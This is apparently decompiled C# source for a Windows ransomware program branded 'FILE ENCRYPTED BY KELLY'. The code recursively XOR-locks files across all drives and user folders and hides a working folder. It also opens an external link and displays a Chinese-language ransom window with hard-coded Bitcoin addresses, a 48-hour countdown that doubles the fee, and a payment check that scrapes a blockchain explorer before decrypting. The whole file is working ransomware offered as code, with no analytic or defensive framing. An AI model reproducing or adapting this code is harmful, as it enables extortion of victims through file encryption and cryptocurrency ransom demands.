using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Windows.Forms;
using HtmlAgilityPack;

namespace Leen;

public class Main : Form
{
	private string envPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\Driver";

	private int timeLeft = 172800;

	private int dirCount = 0;

	private IContainer components = null;

	private Button start;

	private Label label1;

	private PictureBox pictureBox1;

	private Label label2;

	private RichTextBox richTextBox1;

	private Button button1;

	private TextBox textBox1;

	private Label label3;

	private PictureBox pictureBox2;

	private Timer timer1;

	private Label timerLabel;

	private Label label4;

	private Label amount;

	private Label label5;

	public Main()
	{
		Console.WriteLine(Directory.GetCurrentDirectory() + "\\" + Process.GetCurrentProcess().ProcessName + ".exe");
		FileSystemOperator fileSystemOperator = new FileSystemOperator();
		fileSystemOperator.WriteLog("[Main] Start .Net Version=" + Environment.Version.ToString());
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		DirectoryInfo directoryInfo = Directory.CreateDirectory(folderPath + "\\Driver");
		directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.Directory;
		InitializeComponent();
		load(fileSystemOperator);
		timer1.Start();
		timer1.set_Interval(1000);
		genAddress(fileSystemOperator);
		fileLockOrUnlock(fileSystemOperator, "lock", 1);
		fileSystemOperator.WriteLog("[Main] DirCount=" + Convert.ToString(dirCount));
		Console.WriteLine(dirCount);
		try
		{
			Process.Start("iexplore.exe", "https://lihi1.cc/4kdW2");
		}
		catch
		{
			fileSystemOperator.WriteLog("[Main] Error .Open Browser Error");
		}
	}

	private void fileLockOrUnlock(FileSystemOperator fileSystemOperator, string method, int stage)
	{
		string[] array = null;
		int num = 0;
		int num2 = 0;
		int[] array2 = new int[2];
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				try
				{
					fileSystemOperator.WriteLog("[fileLockOrUnlock] DriveName = " + driveInfo.RootDirectory.FullName);
					if (!driveInfo.RootDirectory.FullName.Contains("C:\\"))
					{
						try
						{
							array2 = new FileSystemOperator().LockTXTFiles(fileSystemOperator, driveInfo.RootDirectory.FullName, "XOR", stage);
							num += array2[0];
							num2 += array2[1];
						}
						catch (Exception ex)
						{
							fileSystemOperator.WriteLog("[fileLockOrUnlock] no lock with root name Error = " + ex.Message);
						}
						array = Directory.GetDirectories(driveInfo.RootDirectory.FullName);
						string[] array3 = array;
						foreach (string text in array3)
						{
							fileSystemOperator.WriteLog("[fileLockOrUnlock] subdirectory = " + text);
							dirCount++;
							array2 = new FileSystemOperator().LockTXTFiles(fileSystemOperator, text, "XOR", stage);
							num += array2[0];
							num2 += array2[1];
							array2 = LoadSubDirs(fileSystemOperator, text, method, stage);
							num += array2[0];
							num2 += array2[1];
						}
					}
				}
				catch (Exception ex2)
				{
					fileSystemOperator.WriteLog("[fileLockOrUnlock] no lock with Inner Error = " + ex2.Message);
				}
			}
		}
		catch (Exception ex3)
		{
			fileSystemOperator.WriteLog("[fileLockOrUnlock] no lock with C Error = " + ex3.Message);
		}
		try
		{
			array = Directory.GetDirectories("C:\\Users");
			try
			{
				array2 = new FileSystemOperator().LockTXTFiles(fileSystemOperator, "C:\\Users", "XOR", stage);
				num += array2[0];
				num2 += array2[1];
			}
			catch (Exception ex4)
			{
				fileSystemOperator.WriteLog("[fileLockOrUnlock] no lock with Inner C Error = " + ex4.Message);
			}
			string[] array4 = array;
			foreach (string text2 in array4)
			{
				fileSystemOperator.WriteLog("[fileLockOrUnlock] subdirectory = " + text2);
				dirCount++;
				array2 = new FileSystemOperator().LockTXTFiles(fileSystemOperator, text2, "XOR", stage);
				num += array2[0];
				num2 += array2[1];
				array2 = LoadSubDirs(fileSystemOperator, text2, method, stage);
				num += array2[0];
				num2 += array2[1];
			}
			if (method == "lock")
			{
				fileSystemOperator.WriteLog("[fileLockOrUnlock] LOCK RESULT SUCCESS = " + Convert.ToString(num) + " FAIL = " + Convert.ToString(num2));
			}
			else
			{
				fileSystemOperator.WriteLog("[fileLockOrUnlock] UNLOCK RESULT SUCCESS = " + Convert.ToString(num) + " FAIL = " + Convert.ToString(num2));
			}
		}
		catch (Exception ex5)
		{
			fileSystemOperator.WriteLog("[fileLockOrUnlock] lock with C Error = " + ex5.Message);
		}
	}

	private int[] LoadSubDirs(FileSystemOperator fileSystemOperator, string dir, string method, int stage)
	{
		int[] array = new int[2];
		int num = 0;
		int num2 = 0;
		if (method == "lock")
		{
			try
			{
				string[] directories = Directory.GetDirectories(dir);
				string[] array2 = directories;
				foreach (string text in array2)
				{
					fileSystemOperator.WriteLog("[LoadSubDirs] Sub subdirectory = " + text);
					if (!text.Contains("AppData"))
					{
						dirCount++;
						int[] array3 = new FileSystemOperator().LockTXTFiles(fileSystemOperator, text, "XOR", stage);
						num += array3[0];
						num2 += array3[1];
						try
						{
							array3 = LoadSubDirs(fileSystemOperator, text, method, stage);
							num += array3[0];
							num2 += array3[1];
						}
						catch (Exception ex)
						{
							fileSystemOperator.WriteLog("[LoadSubDirs] Sub subdirectory = " + text + "Error = " + ex.Message);
						}
					}
				}
			}
			catch (Exception ex2)
			{
				fileSystemOperator.WriteLog("[LoadSubDirs] Error " + ex2.Message + "Directory = " + dir);
			}
		}
		else
		{
			new FileSystemOperator().UnlockLockyFiles(fileSystemOperator, dir, "XOR");
			try
			{
				string[] directories2 = Directory.GetDirectories(dir);
				string[] array4 = directories2;
				foreach (string text2 in array4)
				{
					if (!text2.Contains("AppData"))
					{
						dirCount++;
						int[] array5 = new FileSystemOperator().UnlockLockyFiles(fileSystemOperator, text2, "XOR");
						num += array5[0];
						num2 += array5[1];
						try
						{
							array5 = LoadSubDirs(fileSystemOperator, text2, method, stage);
							num += array5[0];
							num2 += array5[1];
						}
						catch
						{
						}
					}
				}
			}
			catch (Exception ex3)
			{
				fileSystemOperator.WriteLog("[LoadSubDirs] Error " + ex3.Message + "Directory = " + dir);
			}
		}
		array[0] = num;
		array[1] = num2;
		return array;
	}

	public string httpGet(string url)
	{
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		return new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd();
	}

	private void load(FileSystemOperator fileSystemOperator)
	{
		try
		{
			if (!File.Exists(envPath + "\\t.print"))
			{
				File.WriteAllText(envPath + "\\t.print", Convert.ToString(UnixTimeNow()));
				timeLeft = 172800;
			}
			else
			{
				timeLeft = 172800 - (Convert.ToInt32(UnixTimeNow()) - Convert.ToInt32(File.ReadAllText(envPath + "\\t.print")));
			}
			fileSystemOperator.WriteLog("[load] TimeLeft=" + Convert.ToString(timeLeft));
			Console.WriteLine(timeLeft);
		}
		catch (Exception ex)
		{
			fileSystemOperator.WriteLog("[load] Error" + ex.Message);
		}
	}

	private void encryptFiles(string path, string method, int stage)
	{
		FileSystemOperator fileSystemOperator = new FileSystemOperator();
		fileSystemOperator.LockTXTFiles(fileSystemOperator, path, method, stage);
	}

	private void genAddress(FileSystemOperator fileSystemOperator)
	{
		try
		{
			string[] array = new string[5] { "1Ly1hXiXG5fa4k79of6xPm4xLYFyj5iH8N", "1L9REpvzBkWUhVKzsoLJEVLBh19Ng5jiqb", "1JXXsYGiNmVzEyuj29murEpFqc9sXr5dhn", "1FuPAucXqBXvhzzXguCyQAH7AbGHg6xfrM", "1FgbsSWNHzDnHjbxokLqe1rbjy4juSpsas" };
			Random random = new Random();
			string text = array[random.Next(0, array.Length - 1)];
			string text2 = "";
			string text3 = text;
			foreach (char c in text3)
			{
				text2 += Convert.ToChar(c ^ 5);
			}
			if (!File.Exists(envPath + "\\a.print"))
			{
				File.WriteAllText(envPath + "\\a.print", text2);
			}
			if (!File.Exists(envPath + "\\aaa.print"))
			{
				File.WriteAllText(envPath + "\\aaa.print", "1");
			}
			string text4 = File.ReadAllText(envPath + "\\a.print");
			string text5 = "";
			string text6 = text4;
			foreach (char c2 in text6)
			{
				text5 += Convert.ToChar(c2 ^ 5);
			}
			((Control)textBox1).set_Text(text5);
			if (0.1 * Convert.ToDouble(File.ReadAllText(envPath + "\\aaa.print")) >= 0.4)
			{
				((Control)amount).set_Text(Convert.ToString(0.4));
			}
			else
			{
				((Control)amount).set_Text(Convert.ToString(0.05 * Convert.ToDouble(File.ReadAllText(envPath + "\\aaa.print"))));
			}
			fileSystemOperator.WriteLog("[genAddress] Random address = " + text);
		}
		catch (Exception ex)
		{
			fileSystemOperator.WriteLog("[genAddress] Error" + ex.Message);
		}
	}

	public string GetMACAddress()
	{
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		string text = string.Empty;
		NetworkInterface[] array = allNetworkInterfaces;
		foreach (NetworkInterface networkInterface in array)
		{
			if (text == string.Empty)
			{
				networkInterface.GetIPProperties();
				text = networkInterface.GetPhysicalAddress().ToString();
			}
		}
		return text;
	}

	private void checkPayAndUnlock()
	{
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Expected O, but got Unknown
		//IL_015f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0175: Unknown result type (might be due to invalid IL or missing references)
		((Control)richTextBox1).set_Text("检查付款中,请稍后...");
		string text = "";
		string text2 = "";
		double num = 0.0;
		FileSystemOperator fileSystemOperator = new FileSystemOperator();
		try
		{
			string text3 = httpGet("https://live.blockcypher.com/btc/address/" + ((Control)textBox1).get_Text());
			HtmlDocument val = new HtmlDocument();
			val.LoadHtml(text3);
			HtmlNodeCollection val2 = val.get_DocumentNode().SelectNodes("//div[@class='dash dash-3']//li");
			num = Convert.ToDouble(val2.get_Item(2).get_InnerText().Split(new string[1] { "Balance" }, StringSplitOptions.None)[1].Replace("BTC", "").Trim());
			Console.WriteLine(num);
		}
		catch (Exception ex)
		{
			fileSystemOperator.WriteLog("[Start_Click] Url = https://live.blockcypher.com/btc/address/" + ((Control)textBox1).get_Text() + " Error" + ex.Message);
			num = 0.0;
		}
		if (num > 0.045)
		{
			((Control)richTextBox1).set_Text("收到付款，解锁中请稍后...");
			fileLockOrUnlock(fileSystemOperator, "unlock", 1);
			((Control)richTextBox1).set_Text("解锁成功!");
			text = "解锁完成";
			File.WriteAllText(envPath + "\\b.print", "6688123");
			text2 = "关闭窗口";
			fileSystemOperator.WriteLog("Already Finsh pay BTCAmount=" + Convert.ToString(num));
			MessageBox.Show(text, text2);
		}
		else
		{
			text = "尚未付款(如果已付款请等待1小时后再次按钮确认";
			text2 = "关闭窗口";
			MessageBox.Show(text, text2);
			fileSystemOperator.WriteLog("Not yet pay BTCAmount=" + Convert.ToString(num));
		}
	}

	private void start_Click(object sender, EventArgs e)
	{
		Thread thread = new Thread(checkPayAndUnlock);
		thread.Start();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		Clipboard.SetText(File.ReadAllText(envPath + "\\a.print"));
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		if (timeLeft > 0)
		{
			int num = timeLeft / 3600;
			int num2 = timeLeft % 3600 / 60;
			int num3 = timeLeft % 3600 % 60;
			TimeSpan.FromSeconds(timeLeft);
			timeLeft--;
			((Control)timerLabel).set_Text(num + ":" + num2 + ":" + num3);
		}
		else
		{
			File.WriteAllText(envPath + "\\aaa.print", Convert.ToString(2.0 * Convert.ToDouble(File.ReadAllText(envPath + "\\aaa.print"))));
			double num4 = 0.05 * Convert.ToDouble(File.ReadAllText(envPath + "\\aaa.print"));
			if (num4 >= 0.4)
			{
				((Control)amount).set_Text(Convert.ToString(0.4));
			}
			else
			{
				MessageBox.Show("由于您长时间未付款，价格提升为两倍", "Sorry!");
			}
			timeLeft = 172800;
			File.WriteAllText(envPath + "\\t.print", Convert.ToString(UnixTimeNow()));
		}
	}

	public long UnixTimeNow()
	{
		return (long)(DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0)).TotalSeconds;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0104: Expected O, but got Unknown
		//IL_01a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b1: Expected O, but got Unknown
		//IL_020b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0215: Expected O, but got Unknown
		//IL_0291: Unknown result type (might be due to invalid IL or missing references)
		//IL_029b: Expected O, but got Unknown
		//IL_031c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0326: Expected O, but got Unknown
		//IL_048e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0498: Expected O, but got Unknown
		//IL_0516: Unknown result type (might be due to invalid IL or missing references)
		//IL_0520: Expected O, but got Unknown
		//IL_05b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_05be: Expected O, but got Unknown
		//IL_064b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0655: Expected O, but got Unknown
		//IL_06e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ed: Expected O, but got Unknown
		//IL_077b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0785: Expected O, but got Unknown
		//IL_0919: Unknown result type (might be due to invalid IL or missing references)
		//IL_0923: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Main));
		start = new Button();
		label1 = new Label();
		pictureBox1 = new PictureBox();
		label2 = new Label();
		richTextBox1 = new RichTextBox();
		button1 = new Button();
		textBox1 = new TextBox();
		label3 = new Label();
		pictureBox2 = new PictureBox();
		timer1 = new Timer(components);
		timerLabel = new Label();
		label4 = new Label();
		amount = new Label();
		label5 = new Label();
		((ISupportInitialize)pictureBox1).BeginInit();
		((ISupportInitialize)pictureBox2).BeginInit();
		((Control)this).SuspendLayout();
		((ButtonBase)start).set_AutoEllipsis(true);
		((Control)start).set_Font(new Font("微軟正黑體", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)136));
		((Control)start).set_Location(new Point(508, 403));
		((Control)start).set_Name("start");
		((Control)start).set_Size(new Size(196, 35));
		((Control)start).set_TabIndex(0);
		((Control)start).set_Text("查询当前付款状况及解密");
		((ButtonBase)start).set_UseVisualStyleBackColor(true);
		((Control)start).add_Click((EventHandler)start_Click);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("微軟正黑體", 36f, (FontStyle)0, (GraphicsUnit)3, (byte)136));
		((Control)label1).set_Location(new Point(316, 156));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(0, 61));
		((Control)label1).set_TabIndex(1);
		((Control)pictureBox1).set_BackgroundImage((Image)componentResourceManager.GetObject("pictureBox1.BackgroundImage"));
		((Control)pictureBox1).set_Dock((DockStyle)3);
		((Control)pictureBox1).set_Location(new Point(0, 0));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(103, 450));
		pictureBox1.set_TabIndex(2);
		pictureBox1.set_TabStop(false);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Arial Rounded MT Bold", 27.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(SystemColors.Window);
		((Control)label2).set_Location(new Point(212, 9));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(526, 43));
		((Control)label2).set_TabIndex(3);
		((Control)label2).set_Text("FILE ENCRYPTED BY KELLY");
		((Control)richTextBox1).set_Font(new Font("微軟正黑體", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)136));
		((Control)richTextBox1).set_Location(new Point(155, 78));
		((Control)richTextBox1).set_Name("richTextBox1");
		((TextBoxBase)richTextBox1).set_ReadOnly(true);
		((Control)richTextBox1).set_Size(new Size(669, 260));
		((Control)richTextBox1).set_TabIndex(5);
		((Control)richTextBox1).set_Text(componentResourceManager.GetString("richTextBox1.Text"));
		((Control)button1).set_Location(new Point(702, 359));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(66, 33));
		((Control)button1).set_TabIndex(6);
		((Control)button1).set_Text("复制");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)textBox1).set_Location(new Point(302, 366));
		((Control)textBox1).set_Name("textBox1");
		((TextBoxBase)textBox1).set_ReadOnly(true);
		((Control)textBox1).set_Size(new Size(394, 22));
		((Control)textBox1).set_TabIndex(7);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("微軟正黑體", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)136));
		((Control)label3).set_ForeColor(Color.Red);
		((Control)label3).set_Location(new Point(137, 365));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(159, 26));
		((Control)label3).set_TabIndex(8);
		((Control)label3).set_Text("比特币付款地址");
		pictureBox2.set_Image((Image)componentResourceManager.GetObject("pictureBox2.Image"));
		((Control)pictureBox2).set_Location(new Point(710, 394));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(166, 56));
		pictureBox2.set_TabIndex(9);
		pictureBox2.set_TabStop(false);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((Control)timerLabel).set_AutoSize(true);
		((Control)timerLabel).set_Font(new Font("微軟正黑體", 27.75f, (FontStyle)1, (GraphicsUnit)3, (byte)136));
		((Control)timerLabel).set_ForeColor(SystemColors.ButtonHighlight);
		((Control)timerLabel).set_Location(new Point(336, 395));
		((Control)timerLabel).set_Name("timerLabel");
		((Control)timerLabel).set_Size(new Size(170, 47));
		((Control)timerLabel).set_TabIndex(13);
		((Control)timerLabel).set_Text("00:00:00");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("微軟正黑體", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(Color.Lime);
		((Control)label4).set_Location(new Point(137, 404));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(96, 26));
		((Control)label4).set_TabIndex(14);
		((Control)label4).set_Text("解锁费用");
		((Control)amount).set_AutoSize(true);
		((Control)amount).set_Font(new Font("微軟正黑體", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)136));
		((Control)amount).set_ForeColor(Color.Lime);
		((Control)amount).set_Location(new Point(226, 404));
		((Control)amount).set_Name("amount");
		((Control)amount).set_Size(new Size(43, 26));
		((Control)amount).set_TabIndex(15);
		((Control)amount).set_Text("0.1");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("微軟正黑體", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)136));
		((Control)label5).set_ForeColor(Color.Lime);
		((Control)label5).set_Location(new Point(277, 405));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(52, 26));
		((Control)label5).set_TabIndex(16);
		((Control)label5).set_Text("BTC");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(0, 0, 64));
		((Form)this).set_ClientSize(new Size(874, 450));
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)amount);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)timerLabel);
		((Control)this).get_Controls().Add((Control)(object)pictureBox2);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)richTextBox1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)start);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Main");
		((Form)this).set_SizeGripStyle((SizeGripStyle)1);
		((Control)this).set_Text("Leen");
		((ISupportInitialize)pictureBox1).EndInit();
		((ISupportInitialize)pictureBox2).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
